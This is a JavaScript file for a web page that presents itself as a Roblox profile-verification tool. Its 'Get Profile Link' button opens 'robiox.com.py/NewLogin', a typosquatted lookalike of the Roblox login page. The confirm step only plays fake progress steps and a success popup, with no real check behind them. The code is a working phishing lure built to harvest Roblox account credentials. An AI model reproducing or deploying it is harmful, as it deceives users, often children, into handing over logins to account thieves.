const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";

const progressContainer = document.getElementById('progressContainer');
const progressBar = document.getElementById('progressBar');
const modalOverlay = document.getElementById('modalOverlay');
const successPopup = document.getElementById('successPopup');
const successUsernameSpan = document.getElementById('successUsername');
const toastNotification = document.getElementById('toastNotification');

let progressInterval = null;
let toastTimeout = null;

function showToast(title, message, type = 'info', duration = 5000) {
  toastNotification.classList.remove('info', 'success', 'error');
  toastNotification.classList.add(type);
  
  const iconElement = toastNotification.querySelector('.toast-icon i');
  if (type === 'success') {
    iconElement.className = 'fas fa-check-circle';
  } else if (type === 'error') {
    iconElement.className = 'fas fa-exclamation-triangle';
  } else {
    iconElement.className = 'fas fa-info-circle';
  }
  
  toastNotification.querySelector('.toast-title').textContent = title;
  toastNotification.querySelector('.toast-message').textContent = message;
  
  toastNotification.classList.add('show');
  
  if (toastTimeout) clearTimeout(toastTimeout);
  toastTimeout = setTimeout(() => {
    toastNotification.classList.remove('show');
  }, duration);
}

function closeToast() {
  toastNotification.classList.remove('show');
  if (toastTimeout) clearTimeout(toastTimeout);
}

function showSuccessPopup(username) {
  successUsernameSpan.textContent = `@${username}`;
  successPopup.classList.add('active');
}

function closeSuccessPopup() {
  successPopup.classList.remove('active');
}

function resetSteps() {
  const steps = ['step1', 'step2', 'step3'];
  steps.forEach((stepId) => {
    const step = document.getElementById(stepId);
    const iconDiv = step.querySelector('.step-icon');
    const statusSpan = step.querySelector('.step-status');
    iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
    statusSpan.textContent = 'Pending';
    statusSpan.style.color = '#64748b';
  });
}

function updateStep(stepId, isComplete = false) {
  const step = document.getElementById(stepId);
  const iconDiv = step.querySelector('.step-icon');
  const statusSpan = step.querySelector('.step-status');
  
  if (isComplete) {
    iconDiv.innerHTML = '<i class="fas fa-check-circle" style="color: #22c55e;"></i>';
    statusSpan.textContent = 'Completed';
    statusSpan.style.color = '#22c55e';
  } else {
    iconDiv.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #8b5cf6;"></i>';
    statusSpan.textContent = 'In progress';
    statusSpan.style.color = '#8b5cf6';
  }
}

function runSteps(callback) {
  updateStep('step1', false);
  setTimeout(() => {
    updateStep('step1', true);
    updateStep('step2', false);
    setTimeout(() => {
      updateStep('step2', true);
      updateStep('step3', false);
      setTimeout(() => {
        updateStep('step3', true);
        setTimeout(() => {
          if (callback) callback();
        }, 500);
      }, 2500);
    }, 2500);
  }, 2500);
}

function startProgress() {
  progressContainer.style.display = 'block';
  let width = 0;
  if (progressInterval) clearInterval(progressInterval);
  progressInterval = setInterval(() => {
    if (width >= 90) {
      clearInterval(progressInterval);
    } else {
      width += 10;
      progressBar.style.width = width + '%';
    }
  }, 80);
}

function completeProgress() {
  if (progressInterval) {
    clearInterval(progressInterval);
    progressInterval = null;
  }
  progressBar.style.width = '100%';
  setTimeout(() => {
    progressContainer.style.display = 'none';
    progressBar.style.width = '0%';
  }, 500);
}

function isValidProfileLink(profileUrl) {
  if (!profileUrl || profileUrl.trim() === "") return false;
  let url = profileUrl.trim();
  try {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    const urlObj = new URL(url);
    if (!urlObj.hostname.includes('roblox.com')) return false;
    return true;
  } catch (e) {
    return false;
  }
}

function isValidUsername(username) {
  if (!username || username.trim() === "") return false;
  const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
  return usernameRegex.test(username.trim());
}

function handleGetProfileLink() {
  window.open(REDIRECT_URL, '_blank');
  showToast("Link Opened", "Opened in new tab! Get your profile link and paste it above", "success", 4000);
}

function handleConfirm() {
  const profileLink = document.getElementById('profileLinkInput').value.trim();
  const username = document.getElementById('usernameInput').value.trim();
  
  if (profileLink === "") {
    showToast("Missing Information", "Please enter your Roblox profile link", "error", 3000);
    return;
  }
  
  if (username === "") {
    showToast("Missing Information", "Please enter your Roblox username", "error", 3000);
    return;
  }
  
  if (!isValidProfileLink(profileLink)) {
    showToast("Invalid Link", "Make sure it's a valid Roblox profile URL", "error", 4000);
    return;
  }
  
  if (!isValidUsername(username)) {
    showToast("Invalid Username", "Use 3-20 characters (letters, numbers, underscores only)", "error", 4000);
    return;
  }
  
  startProgress();
  resetSteps();
  modalOverlay.classList.add('active');
  
  runSteps(() => {
    completeProgress();
    modalOverlay.classList.remove('active');
    showSuccessPopup(username);
    
    const confirmBtn = document.getElementById('confirmBtn');
    confirmBtn.style.transform = 'scale(1.02)';
    setTimeout(() => {
      confirmBtn.style.transform = '';
    }, 200);
  });
}

document.getElementById('getProfileLink').addEventListener('click', handleGetProfileLink);
document.getElementById('confirmBtn').addEventListener('click', handleConfirm);

document.getElementById('usernameInput').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    handleConfirm();
  }
});

document.getElementById('profileLinkInput').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    handleConfirm();
  }
});

setTimeout(() => {
  showToast("Welcome", "Click 'Get Profile Link' to get your profile link, then paste it above", "info", 5000);
}, 500);